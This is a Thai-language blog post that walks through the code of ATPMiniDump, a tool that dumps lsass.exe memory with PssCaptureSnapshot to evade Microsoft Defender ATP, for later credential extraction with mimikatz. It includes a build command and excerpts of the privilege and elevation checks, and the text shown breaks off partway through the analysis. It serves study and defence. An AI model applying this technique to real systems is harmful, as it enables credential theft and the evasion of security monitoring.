<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Code Note 0x2: ATPMiniDump ::
        Pandora&#39;s Box
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอตามจุดประสงค์ของแต่ละโครงการ
 สวัสดีทุกท่านซึ่งเข้ามาอ่าน Code Note 0x2 ในเดือนกรกฎาคม 2020 ครับ
ในชุดของบล็อก Code Note ครั้งที่สองนี้ เราจะมาดูแนวคิดของการโจมตีโปรเซส lsass.exe ซึ่งนำไปสู่การได้มาซึ่งข้อมูลสำหรับยืนยันตัวตนในสภาพแวดล้อมซึ่งใช้ระบบปฏิบัติการ Windows, แนวคิดและการทำงานของโปรแกรมซึ่งเป็นที่รู้จักกันดีในการนำแนวคิดเหล่านี้มาอิมพลีเมนต์และใช้งานอย่าง mimikatz และโครงการ ATPMiniDump ซึ่งเป็นโครงการที่นำแนวคิดของ mimikatz มาปรับปรุงเพื่อให้สามารถเข้าถึงข้อมูลสำหรับยืนยันตัวตนได้โดยผ่านการตรวจจับของซอฟต์แวร์อย่าง Microsoft Defender Advanced Threat Protection หรือ Microsoft Defender ATP
เนื่องจากหัวข้อซึ่งเราจะพูดถึงการวันนี้อยู่ในชุดของบล็อก Code Note ดังนั้นเราจะพูดถึงแนวคิดและการทำงานซึ่งได้มาจากการอ่านโค้ดของโครงการ ATPMiniDump เป็นสำคัญ ทั้งนี้แนวคิดของการโจมตีและการอิมพลีเมนต์แนวคิดนั้นล้วนแล้วแต่เป็นประเด็นที่น่าสนใจทั้งในมุมของการทำ Red teaming ซึ่งมีเป้าหมายสำคัญในการหลบหลีกการตรวจจับ และในมุมของฝั่ง Defense ซึ่งมีหน้าที่ในการเฝ้าระวังและตรวจหาพฤติกรรมการโจมตีเหล่านี้ให้ได้ ผมจะขอพูดถึงประเด็นเหล่านี้ในอนาคตหากมีโอกาสครับ
หัวข้อซึ่งเราจะพูดถึงในบล็อกมีดังนี้ครับ
 Project Overview Project Background  Attacking lsass.exe About ATPMiniDump   Code Analysis  Functions  wmain Function GetPID Function IsElevated Function SetDebugPrivilege Function   Notes  Loading External Function with Function Pointer     Final Notes  เครดิตซึ่งทำให้รีเสิร์ชชิ้นนี้เกิดขึ้นได้มีดังนี้ครับ"
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://pandora.sh/posts/code-note-0x2-atpminidump/" />

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
    onload="renderMathInElement(document.body);"></script>


<link rel="stylesheet" href="https://pandora.sh/assets/style.css" />

<link rel="stylesheet" href="https://pandora.sh/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="https://pandora.sh/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="https://pandora.sh/img/favicon.png" />


<link href="https://pandora.sh/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://pandora.sh/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://pandora.sh/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://pandora.sh/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://pandora.sh/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://pandora.sh/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Code Note 0x2: ATPMiniDump"/>
<meta name="twitter:description" content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในฉบับที่ 0x2 จะเป็นการนำโค้ดจากโครงการ ATPMiniDump มาทำการวิเคราะห์และตรวจสอบ โดยจะนำผลลัพธ์ที่ได้ไปใช้ในการทดสอบและประเมินผลกับโซลูชัน Endpoint Detection and Response ต่อไป"/>



<meta property="og:title" content="Code Note 0x2: ATPMiniDump" />
<meta property="og:description" content="Code Note คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดของโปรแกรมจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอแนะ โดย Code Note ในฉบับที่ 0x2 จะเป็นการนำโค้ดจากโครงการ ATPMiniDump มาทำการวิเคราะห์และตรวจสอบ โดยจะนำผลลัพธ์ที่ได้ไปใช้ในการทดสอบและประเมินผลกับโซลูชัน Endpoint Detection and Response ต่อไป" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://pandora.sh/posts/code-note-0x2-atpminidump/" />
<meta property="article:published_time" content="2020-07-28T13:29:50+07:00" />
<meta property="article:modified_time" content="2020-07-28T13:29:50+07:00" /><meta property="og:site_name" content="Pandora&#39;s Box" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Pandora&#39;s Box</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Code Note 0x2: ATPMiniDump</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2020-07-28
        </span>

        
          
        
      

      
        <span class="post-author"
          >— Written by P. Boonyakarn</span
        >


      
    </div>

    

    

    <div class="post-content">
      
      <blockquote>
<p><strong>Code Note</strong> คือชุดของบล็อกและโพสต์ซึ่งจะนำโค้ดจากโครงการโอเพนซอร์สมาทำการวิเคราะห์และทำความเข้าใจ ให้ความหมายและข้อเสนอตามจุดประสงค์ของแต่ละโครงการ</p>
</blockquote>
<p>สวัสดีทุกท่านซึ่งเข้ามาอ่าน Code Note 0x2 ในเดือนกรกฎาคม 2020 ครับ</p>
<p>ในชุดของบล็อก <strong>Code Note</strong> ครั้งที่สองนี้ เราจะมาดูแนวคิดของการโจมตีโปรเซส <code>lsass.exe</code> ซึ่งนำไปสู่การได้มาซึ่งข้อมูลสำหรับยืนยันตัวตนในสภาพแวดล้อมซึ่งใช้ระบบปฏิบัติการ Windows, แนวคิดและการทำงานของโปรแกรมซึ่งเป็นที่รู้จักกันดีในการนำแนวคิดเหล่านี้มาอิมพลีเมนต์และใช้งานอย่าง mimikatz และโครงการ ATPMiniDump ซึ่งเป็นโครงการที่นำแนวคิดของ mimikatz มาปรับปรุงเพื่อให้สามารถเข้าถึงข้อมูลสำหรับยืนยันตัวตนได้โดยผ่านการตรวจจับของซอฟต์แวร์อย่าง Microsoft Defender Advanced Threat Protection หรือ Microsoft Defender ATP</p>
<p>เนื่องจากหัวข้อซึ่งเราจะพูดถึงการวันนี้อยู่ในชุดของบล็อก <strong>Code Note</strong> ดังนั้นเราจะพูดถึงแนวคิดและการทำงานซึ่งได้มาจากการอ่านโค้ดของโครงการ ATPMiniDump เป็นสำคัญ ทั้งนี้แนวคิดของการโจมตีและการอิมพลีเมนต์แนวคิดนั้นล้วนแล้วแต่เป็นประเด็นที่น่าสนใจทั้งในมุมของการทำ Red teaming ซึ่งมีเป้าหมายสำคัญในการหลบหลีกการตรวจจับ และในมุมของฝั่ง Defense ซึ่งมีหน้าที่ในการเฝ้าระวังและตรวจหาพฤติกรรมการโจมตีเหล่านี้ให้ได้ ผมจะขอพูดถึงประเด็นเหล่านี้ในอนาคตหากมีโอกาสครับ</p>
<p>หัวข้อซึ่งเราจะพูดถึงในบล็อกมีดังนี้ครับ</p>
<ul>
<li><a href="#project-overview">Project Overview</a></li>
<li><a href="#project-background">Project Background</a>
<ul>
<li><a href="#attacking-lsassexe">Attacking lsass.exe</a></li>
<li><a href="#about-atpminidump">About ATPMiniDump</a></li>
</ul>
</li>
<li><a href="#code-analysis">Code Analysis</a>
<ul>
<li><a href="#functions">Functions</a>
<ul>
<li><a href="#wmain-function">wmain Function</a></li>
<li><a href="#getpid-function">GetPID Function</a></li>
<li><a href="#iselevated-function">IsElevated Function</a></li>
<li><a href="#setdebugprivilege-function">SetDebugPrivilege Function</a></li>
</ul>
</li>
<li><a href="#notes">Notes</a>
<ul>
<li><a href="#loading-external-function-with-function-pointer">Loading External Function with Function Pointer</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#final-notes">Final Notes</a></li>
</ul>
<p>เครดิตซึ่งทำให้รีเสิร์ชชิ้นนี้เกิดขึ้นได้มีดังนี้ครับ</p>
<ul>
<li>โครงการ <a href="https://github.com/b4rtik/ATPMiniDump">ATPMiniDump</a> โดย Matteo Malvica ซึ่งมีที่มาจากรีเสิร์ชของการพยายามหาวิธีการข้ามผ่านการตรวจจับเมื่อต้องดึงข้อมูลออกมาจากหน่วยความจำของโปรเซส <code>lsass.exe</code> (<a href="https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/">ดูบล็อกต้นฉบับได้ที่นี่</a>)</li>
<li>โครงการ <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> โดย Benjamin Delpy ซึ่งนำแนวคิดเกี่ยวกับความปลอดภัยใน Windows มาอิมพลีเมนต์เป็นโปรแกรมซึ่งสามารถใช้ได้จากทั่งฝังโจมตีและฝั่งป้องกัน</li>
<li>หนังสือ <a href="https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860">A Guide to Kernel Exploitation</a> ที่เข้ามามีส่วนสำคัญในการอธิบายโค้ดและการเรียกใช้งาน Windows API ในระดับของ Kernel</li>
<li>เว็บไซต์ <a href="https://www.geoffchappell.com/index.htm">Geoff Chappell, Software Analyst</a> โดย Geoff Chappell ที่ช่วยอธิบายการใช้งาน Windows API ในระดับ Kernel ด้วยรายละเอียดที่มีมากกว่า <a href="https://docs.microsoft.com/en-us/">Microsoft Docs (MSDN)</a></li>
</ul>
<h1 id="project-overview">Project Overview</h1>
<p>ข้อมูลจาก GitHub แสดงให้เห็นว่าโครงการนี้ถูกพัฒนาโดยใช้ภาษา C ทั้งหมด โดยโครงการนี้มีโครงสร้างของไฟล์และไดเรกทอรีตามแผนภาพด้านล่างครับ</p>
<pre><code>.
├── ATPMiniDump
│   ├── ATPMiniDump.c
│   ├── ATPMiniDump.h
│   ├── ATPMiniDump.vcxproj
│   ├── ATPMiniDump.vcxproj.filters
│   ├── ATPMiniDump.vcxproj.user
├── ATPMiniDump.sln
├── LICENSE
└── README.md
</code></pre><p>การตรวจสอบไฟล์แต่ละรายการที่ปรากฎในโครงสร้างของโครงการปรากฎไฟล์ดังนี้</p>
<ol>
<li>ไฟล์ในไดเรกทอรี <code>ATPMiniDump</code> เก็บโค้ดหลักของโครงการและไฟล์ประกอบอื่นๆ ได้แก่
<ol>
<li>ไฟล์ <code>ATPMiniDump.c</code> จัดเก็บโค้ดการทำงานหลักของโครงการ</li>
<li>ไฟล์ <code>ATPMiniDump.h</code> จัดเก็บการประกาศค่าและตัวแปรเฉพาะในลักษณะต่างๆ</li>
<li>ไฟล์ <code>ATPMiniDump.vcxproj</code> จัดเก็บรายละเอียดในการ build โครงการสำหรับ Visual Studio</li>
<li>ไฟล์ <code>ATPMiniDump.vcxproj.filters</code> จัดเก็บการตั้งค่าของไฟล์ที่จะถูกแสดงใน Visual Studio</li>
</ol>
</li>
<li>ไฟล์ ATPMiniDump.sln จัดเก็บข้อมูลการตั้งค่าของ Solution สำหรับ Visual Studio</li>
</ol>
<p>ในกรณีของการ build ผ่านโปรแกรม <code>cl.exe</code> ให้ใช้คำสั่งดังต่อไปนี้</p>
<pre><code>cl.exe ATPMiniDump.c Advapi32.lib
</code></pre><p>กระบวนการ build สามารถทำได้ผ่าน Visual Studio เช่นกัน</p>
<h1 id="project-background">Project Background</h1>
<h2 id="attacking-lsassexe">Attacking lsass.exe</h2>
<p>โปรเซส <code>lsass.exe</code> นั้นเป็นโปรเซสของเซอร์วิสของระบบซึ่งมีชื่อเต็มว่า Local Security Authorithy Subsystem Service (LSASS) ซึ่งอิมพลีเมนต์แนวคิด Local Security Authorithy (LSA) เซอร์วิสของระบบเซอร์วิสนี้มีหน้าที่รับผิดชอบสำคัญในการบังคับใช้มาตรการรักษาความปลอดภัยที่กำหนดใดๆ กับระบบ รวมไปถึงมีหน้าในการพิสูจน์ตัวตนผู้ใช้งานทั้งในกรณีที่ผู้ใช้งานทำการเข้าถึงระบบผ่านทางหน้าจอเมื่อเปิดใช้งานระบบ หรือพิสูจน์ตัวตนในช่องทางทางเครือข่ายอื่นๆ เซอร์วิสนี้ยังทำหน้าที่ในการคุมสิทธิ์ในการเข้าถึงทรัพยากรของระบบผ่านการสร้างและจัดการ access token ด้วย (อ้างอิง <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Wikipedia</a>)</p>
<p>ด้วยหน้าที่รับผิดชอบสำคัญของเซอร์วิสและโปรเซส <code>lsass.exe</code> ที่เกี่ยวข้องกับข้อมูลที่ใช้ในการพิสูจน์ตัวตนของผู้ใช้งาน โปรเซส <code>lsass.exe</code> จึงตกเป็นเป้าหมายในการโจมตีหลายรูปแบบ หนึ่งในรูปแบบในการโจมตีต่อโปรเซส <code>lsass.exe</code> ซึ่งเป็นที่รู้จักมากที่สุดรูปแบบหนึ่งคือการพยายามเข้าถึงข้อมูลใดๆ ที่โปรเซส <code>lsass.exe</code> กำลังประมวลผลอยู่ ค้นหาข้อมูลสำหรับยืนยันตัวตนไม่ว่าจะเป็นรหัสผ่านหรือค่าแฮชที่เก็บอยู่ในหน่วยความจำของโปรเซส และนำค่าหรือข้อมูลดังกล่าวออกมาใช้งาน</p>
<p>หนึ่งในโครงการซึ่งนำแนวคิดของการโจมตีและแสวงหาประโยชน์มาใช้งานและเป็นที่รู้จักอย่างกว้างขวางคือ <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> ซึ่งมีนักพัฒนาหลักคือ Bejamin <em>gentilkiwi</em> Delpy โครงการ mimikatz นำแนวคิดของการเข้าถึงโปรเซส <code>lsass.exe</code> รวมไปถึงโปรเซสที่เกี่ยวข้องกับการจัดการความปลอดภัยในระบบอื่นๆ เพื่อระบุหาข้อมูลสำหรับยืนยันตัวตนมาทำการอิมพลีเมนต์ให้สามารถใช้งานได้จริง ส่งผลให้ mimikatz กลายเป็นเครื่องมือยอดนิยมในการประเมินความปลอดภัยระบบและยังถูกใช้ในการโจมตีจริงโดย<a href="https://attack.mitre.org/software/S0002/">หลายกลุ่มผู้โจมตี</a>อีกด้วย</p>
<p>ความนิยมของ mimikatz ในการใช้งานเพื่อโจมตีระบบจริงนั้นส่งผลให้เทคโนโลยีในฝั่งของการตรวจจับและป้องกันภัยคุกคามจำเป็นต้องขยับตาม มีเทคโนโลยีหลายรูปแบบเริ่มอิมพลีเมนต์แนวคิดมากมายภายใต้จุดประสงค์ที่ไม่แตกต่างกันมากนักคือการตรวจจับกิจกรรมใดๆ ในลักษณะที่ผิดปกติกับโปรเซส <code>lsass.exe</code> และขัดขวางกิจกรรมดังกล่าวนั้นในกรณีที่สามารถระบุได้จริงว่ากิจกรรมดังกล่าวนั้นมีจุดประสงค์ที่มุ่งร้ายจริง</p>
<h2 id="about-atpminidump">About ATPMiniDump</h2>
<p>โครงการ ATPMiniDump ถูกพัฒนาออกมาภายใต้จุดประสงค์เพื่อให้โปรแกรม ATPMiniDump สามารถหลบหลีกการตรวจจับโดยเทคโนโลยีในฝั่งของการตรวจจับและป้องกันภัยคุกคามโดยเฉพาะอย่างยิ่ง Microsoft Defender ATP ได้ และยังสามารถทำงานจนบรรลุจุดประสงค์ของมันคือการสร้างไฟล์ที่มีข้อมูลจากหน่วยความจำของโปรเซส <code>lsass.exe</code> ได้โดยไม่ถูกขัดขวาง ทั้งนี้วิธีการที่ถูกใช้เพื่อข้ามผ่านการตรวจจับนี้ในปัจจุบันได้ถูกรายงานให้กับทางไมโครซอฟต์เพื่อทำการแก้ไขแล้ว</p>
<p>ในส่วนเริ่มต้นของบล็อก <a href="https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/">Evading WinDefender ATP credential-theft: a hit after a hit-and-miss start</a> นั้น ผู้พัฒนาโครงการ ATPMiniDump ได้อธิบายถึงสมมติฐานที่น่าสนใจเกี่ยวกับแนวคิดที่ใช้ในการตรวจจับกิจกรรมต้องสงสัยกับโปรเซส <code>lsass.exe</code> ว่า Microsoft Defender ATP อาจเฝ้าระวังพฤติกรรมต้องสงสัยโดยการตรวจสอบจำนวนของข้อมูลที่ถูกอ่านผ่านฟังก์ชัน <code>ReadProcessMemory()</code> เมื่อมีปลายทางของการเข้าถึงคือโปรเซส lsass.exe</p>
<p>ฟังก์ชัน <code>ReadProcessMemory()</code> เป็นฟังก์ชันซึ่งทำให้โปรเซสที่เรียกใช้ฟังก์ชันนี้สามารถคัดลอกข้อมูลซึ่งอยู่ในพื้นที่หน่วยความจำของโปรเซสอื่นในตำแหน่งที่ระบุมาเก็บไว้ในพื้นที่หน่วยความจำของโปรเซสตัวเองได้ ฟังก์ชัน <code>ReadProcessMemory()</code> เป็นฟังก์ชันสำคัญซึ่งถูกใช้ใน mimikatz ภายใต้ฟังก์ชัน <code>kull_m_memory_copy()</code> ซึ่งจะถูกเรียกใช้อยู่เสมอเมื่อ mimikatz จะทำการเข้าถึงข้อมูลในโปรเซส อาทิ จากฟังก์ชัน <code>kuhl_m_sekurlsa_getLogonData()</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">BOOL <span style="color:#a6e22e">kull_m_memory_copy</span>(OUT PKULL_M_MEMORY_ADDRESS Destination, 
    IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length)
{
	...
	<span style="color:#66d9ef">switch</span>(Destination<span style="color:#f92672">-&gt;</span>hMemory<span style="color:#f92672">-&gt;</span>type)
	{
	<span style="color:#66d9ef">case</span> KULL_M_MEMORY_TYPE_OWN:
		<span style="color:#66d9ef">switch</span>(Source<span style="color:#f92672">-&gt;</span>hMemory<span style="color:#f92672">-&gt;</span>type)
		{
		...
		<span style="color:#66d9ef">case</span> KULL_M_MEMORY_TYPE_PROCESS:
			status <span style="color:#f92672">=</span> ReadProcessMemory(
                Source<span style="color:#f92672">-&gt;</span>hMemory<span style="color:#f92672">-&gt;</span>pHandleProcess<span style="color:#f92672">-&gt;</span>hProcess, <span style="color:#75715e">// hProcess
</span><span style="color:#75715e"></span>                Source<span style="color:#f92672">-&gt;</span>address, <span style="color:#75715e">// lpBaseAddress
</span><span style="color:#75715e"></span>                Destination<span style="color:#f92672">-&gt;</span>address, <span style="color:#75715e">// lpBuffer
</span><span style="color:#75715e"></span>                Length, <span style="color:#75715e">// nSize
</span><span style="color:#75715e"></span>                NULL <span style="color:#75715e">// *lpNumberofBytesRead
</span><span style="color:#75715e"></span>            );
			<span style="color:#66d9ef">break</span>;
        ...
		}
		<span style="color:#66d9ef">break</span>;
    ...
</code></pre></div><p>โครงการ ATPMiniDump จึงเลือกใช้ฟังก์ชัน <code>PssCaptureSnapShot()</code> ซึ่งเป็นฟังก์ชันในการสร้าง snapshot ของโปรเซสแทนฟังก์ชัน <code>ReadProcessMemory()</code> การทำ process snapshotting นั้นเป็นกระบวนการในรวบรวมข้อมูลในหน่วยความจำของโปรเซสเพื่อจุดประสงค์ในการสร้างข้อมูล snapshot สำหรับการวิเคราะห์และแก้ไขปัญหาของระบบ ดังนั้นในกรณีของ ATPMiniDump นั้น ฟังก์ชัน <code>PssCaptureSnapShot()</code> อาจสามารถเรียกได้ว่าถูกนำมาใช้ในทางที่ผิด (abuse) นั่นเอง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">DWORD <span style="color:#a6e22e">PssCaptureSnapshot</span>(
  HANDLE            ProcessHandle,
  PSS_CAPTURE_FLAGS CaptureFlags,
  DWORD             ThreadContextFlags,
  HPSS              <span style="color:#f92672">*</span>SnapshotHandle
);
</code></pre></div><p>บล็อกของผู้พัฒนา ATPMiniDump จะแสดงถึงการวิเคราะห์ฟังก์ชัน <code>PssCaptureSnapShot()</code> เพื่อยืนยันว่าฟังก์ชันดังกล่าวสามารถถูกใช้เพื่อนำข้อมูลซึ่งอยู่ในหน่วยความจำของโปรเซสที่ต้องการออกมาด้วย โดยในของโปรเซส <code>lsass.exe</code> นั้น ฟังก์ชัน <code>PssCaptureSnapShot()</code> สามารถนำข้อมูลในหน่วยความจำรวมไปถึงรหัสผ่านและค่าแฮชซึ่งถูกเก็บไว้ที่สามารถนำเขียนลงไฟล์ได้ทันที จากนั้นไฟล์ซึ่งเก็บข้อมูลนี้ก็จะถูกนำมาวิเคราะห์โดยฟังก์ชัน <code>sekurlsa::minidump</code> ของ mimikatz เพื่อนำข้อมูลสำคัญที่ต้องการออกมาได้</p>
<h1 id="code-analysis">Code Analysis</h1>
<p>ในส่วนถัดไป เราจะมาเริ่มการวิเคราะห์โค้ดของโครงการ ATPMiniDump โดยจะอ้างอิงการทำงานของฟังก์ชัน <code>wmain()</code> เป็นหลัก ผมจะแยกการทำงานของฟังก์ชันอื่นออกเป็นหัวข้อย่อยเพื่อให้สามารถอ่านได้เพิ่มเติมโดยไม่ขัดจังหวะการอ่านหัวข้อปัจจุบัน และจะมีการเพิ่มโน้ตในอ่านและทำความเข้าใจเป็นหัวข้อย่อยด้วยครับ</p>
<h2 id="functions">Functions</h2>
<h3 id="wmain-function">wmain Function</h3>
<blockquote>
<p>ดูโค้ดของฟังก์ชัน <code>wmain()</code> แบบเต็มได้<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L122">ที่นี่</a></p>
<p>โค้ดในฟังก์ชัน <code>wmain()</code> มีการพยายามเรียกใช้ฟังก์ชันซึ่งอยู่ในไลบรารี DLL อื่น แนะนำให้อ่านหัวข้อ <a href="#loading-external-function-with-function-pointer">Loading External Function with Function Pointer</a> เพิ่มเติมเพื่อความเข้าใจที่มากขึ้นครับ</p>
</blockquote>
<p>ฟังก์ชัน <code>wmain()</code> เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภทจำนวนเต็มเป็นผลลัพธ์ ฟังก์ชันมีการรับพารามิเตอร์ไว้ตามที่ระบุคือจำนวนของอากิวเมนต์ซึ่งอยู่ในลักษณะจำนวนเต็มด้วยตัวแปร <code>argc</code> และรายการของค่าอากิวเมนต์ในรูปแบบอาเรย์ประเภท <code>wchar_t</code> ด้วยตัวแปร <code>argv[]</code> การตั้งชื่อฟังก์ชันว่า <code>wmain()</code> แทนที่จะ <code>main()</code> ตามปกตินั้นเป็นไปตามแนวทางของ Unicode programming model ซึ่งสามารถดูรายละเอียดความจำเป็นของการใช้งานได้ที่<a href="https://docs.microsoft.com/en-us/cpp/c-language/using-wmain?view=vs-2019">เอกสารของไมโครซอฟต์</a></p>
<p>ฟังก์ชัน <code>wmain()</code> สามารถถูกแบ่งลำดับการทำงานออกเป็น 4 ขั้นตอนใหญ่ๆ ได้ตามรายการดังนี้</p>
<ol>
<li>ขั้นตอนของการตรวจสอบสภาพแวดล้อมและเตรียมความพร้อมผ่านการใช้ฟังก์ชัน <code>IsElevated()</code> และ <code>SetDebugPrivilege()</code></li>
<li>ขั้นตอนของการตรวจสอบรุ่นของระบบปฏิบัติการ เกิดขึ้นหลังจากมีการแสดงข้อความ <code>[1] Checking OS version details:</code></li>
<li>ขั้นตอนการตรวจสอบโปรเซสและทำการดึงข้อมูลสำหรับยืนยันตัวออกมาจากโปรเซส <code>lsass.exe</code> ด้วยฟังก์ชัน <code>PssCaptureSnapshot()</code> เกิดขึ้นหลังจากมีการแสดงข้อความ <code>[2] Checking Process details:</code></li>
<li>ขั้นตอนของการสร้างไฟล์ memory dump จากข้อมูลของหน่วยความจำจากขั้นตอนก่อนหน้า เกิดขึ้นหลังจากมีการแสดงข้อความ <code>[3] create memorydump file:</code></li>
</ol>
<p>ฟังก์ชัน <code>wmain()</code> เริ่มต้นการทำงานด้วยการเตรียมความพร้อมในการระบุค่าและตรวจสอบสถานะการตั้งค่าของระบบต่างๆ ตามที่เห็นในโค้ดด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(LPVOID) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">8</span>) {
		wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[!] Sorry, this tool only works on a x64 version of Windows.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
		exit(<span style="color:#ae81ff">1</span>);
}

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>IsElevated()) {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[!] You need elevated privileges to run this tool!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  exit(<span style="color:#ae81ff">1</span>);
}

SetDebugPrivilege();
</code></pre></div><p>ขั้นตอนการทำงานแต่ละขั้นตอนสามารถอธิบายได้ตามรายการดังนี้</p>
<ul>
<li>ตรวจสอบว่าสถาปัตยกรรมที่โค้ดทำงานอยู่เป็นแบบ 64 บิตหรือไม่ด้วยการเช็คขนาดของประเภทของข้อมูล <code>LPVOID</code> โดยหากขนาดของ <code>LPVOID</code> ไม่เท่ากับ 8 ไบต์ซึ่งค่าปกติของสถาปัตยกรรมแบบ 64 บิตนั้น ฟังก์ชันจะหยุดการทำงานทันที</li>
<li>ทำการเรียกใช้ฟังก์ชัน <code>IsElevated()</code> เพื่อตรวจสอบว่าโปรแกรมถูกรันด้วยสิทธิ์ที่เพียงพอหรือไม่ การตรวจสอบทำโดยการตรวจสอบ access token ของระบบซึ่งสามารถดูเพิ่มเติมได้ที่หัวข้อของการวิเคราะห์<a href="#iselevated-function">ฟังก์ชัน <code>IsElevated()</code></a></li>
<li>ทำการเรียกใช้ฟังก์ชัน <code>SetDebugPrivilege()</code> เพื่อกำหนดสิทธิ์ของโปรเซส <code>ATPMiniDump.exe</code> ให้มีสิทธิ์ <code>SeDebugPrivilege</code> การกำหนดสิทธิ์สามารถดูเพิ่มเติมได้ที่หัวข้อของการวิเคราะห์<a href="#setdebugprivilege-function">ฟังก์ชัน <code>SetDebugPrivilege()</code></a></li>
</ul>
<p>เมื่อการตรวจสอบเงื่อนไขและตั้งค่าเสร็จสมบูรณ์ ฟังก์ชัน <code>wmain()</code> จะเริ่มทำการสร้างตัวแปรใหม่ภายใต้ชื่อ <code>pWinVerInfo</code> มีประเภทของตัวแปรเป็น <code>PWIN_VER_INFO</code> ตามที่ระบุไว้ในไฟล์ <code>ATPMiniDump.h</code> <a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L49">ในบรรทัดที่ 49</a></p>
